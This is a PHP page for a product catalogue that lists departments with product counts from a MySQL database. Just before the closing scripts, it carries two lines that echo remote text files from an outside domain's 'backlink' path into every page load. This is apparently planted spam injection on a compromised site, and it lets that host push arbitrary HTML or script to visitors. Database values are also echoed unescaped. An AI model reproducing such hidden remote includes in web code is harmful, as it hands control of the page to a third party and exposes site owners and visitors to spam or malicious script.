<?PHP include_once('connections/connection.php'); 
include_once('include/function.php');
$PAGE=1;
?>
<!DOCTYPE html>
<html lang="en">
<head>
<?PHP include_once('meta.php'); ?>
</head>
<body>
  <!-- Navigation -->
   <?PHP include_once('navigation.php'); ?>
  <!-- Header -->
  <?PHP include_once('header.php'); ?>
<!-- (.bg-primary, .bg-success, .bg-info, .bg-warning, .bg-danger, .bg-secondary, .bg-dark and .bg-light) -->
  <!-- Page Content -->
  <div class="container"  style="min-height:240px">
 <div class="row">
  <?PHP
$SQL=mysqli_query($connect,"SELECT * FROM inc_department ORDER BY    ID  ASC");  
				while($rs = mysqli_fetch_array($SQL)){ 
$rsc=mysqli_fetch_array(mysqli_query($connect,"SELECT  COUNT(ID) FROM spdp_product WHERE DEPARTMENT_RECORD='$rs[ID]' ")); 
					?>  
      <div  class="col-xl-3">
		<a class="nav-link" href="products.php?id=<?PHP echo $rs['ID'];?>"><?PHP echo $rs['DEPARTMENT_NAME'];?> <span class="badge badge-warning"><?PHP echo $rsc[0];?></span></a>
      </div>
<?PHP }?>
 </div>
  </div>
  <!-- /.container -->
  <!-- Footer -->
 <?PHP include_once('footer.php'); ?>
<?php echo file_get_contents("https://wlbsite.xyz/backlink/goat.txt"); ?>            
<?php echo file_get_contents("https://wlbsite.xyz/backlink/goal.txt"); ?>
  <!-- Bootstrap core JavaScript -->
  <script src="vendor/jquery/jquery.min.js"></script>
  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
</body>
</html>
